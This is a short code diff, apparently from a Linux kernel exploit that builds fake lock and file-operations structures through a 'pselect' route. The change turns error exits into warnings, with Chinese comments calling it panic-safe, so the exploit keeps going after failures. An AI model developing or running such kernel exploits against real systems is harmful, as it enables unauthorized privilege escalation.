@@ -89,8 +89,9 @@ void do_pselect_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     cfi_last_step = 30;
     cfi_last_errno = 0;
-    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
-             page_base, fake_lock, fake_fops);
+    /* Panic-safe: 缺少内核页基址, 回退而非 exit */
+    pr_warning("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
+               page_base, fake_lock, fake_fops);
     return;
   }
 
@@ -104,9 +105,10 @@ void do_pselect_fake_lock_route(void) {
       if (!page_base || !fake_lock || !fake_fops) {
         cfi_last_step = 34;
         cfi_last_errno = errno;
-        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
-                 "lock=%016zx fops=%016zx\n",
-                 route_attempt, page_base, fake_lock, fake_fops);
+        /* Panic-safe: 重试页准备失败, break 让外层汇总状态 */
+        pr_warning("pselect retry page prepare failed attempt=%d base=%016zx "
+                   "lock=%016zx fops=%016zx\n",
+                   route_attempt, page_base, fake_lock, fake_fops);
         break;
       }
     }
@@ -117,7 +119,8 @@ void do_pselect_fake_lock_route(void) {
     if (high_read < 0) {
       cfi_last_step = 31;
       cfi_last_errno = errno;
-      pr_error("pselect F_DUPFD read errno=%d\n", errno);
+      /* Panic-safe: F_DUPFD 失败, break 让外层汇总状态 */
+      pr_warning("pselect F_DUPFD read errno=%d\n", errno);
       close(pipefd[0]);
       close(pipefd[1]);
       break;
